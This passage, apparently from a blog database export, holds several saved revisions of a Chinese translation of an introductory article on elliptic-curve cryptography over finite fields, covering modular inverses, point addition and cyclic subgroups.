- x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\\n</p>\\n\\n<p>\\n    循环子群是 ECC 以及其他密码学系统的ji'chu\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[1,\"p\",[]]]}","created_at_ts":1577277503716,"created_at":"2019-12-25 12:38:23"},{"id":"5e0358432ee0ee0001819d3d","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\\n</p>\\n\\n<p>\\n    循环子群是 ECC 以及其他密码学系统的基础\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[1,\"p\",[]]]}","created_at_ts":1577277507140,"created_at":"2019-12-25 12:38:27"},{"id":"5e0358522ee0ee0001819d3f","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 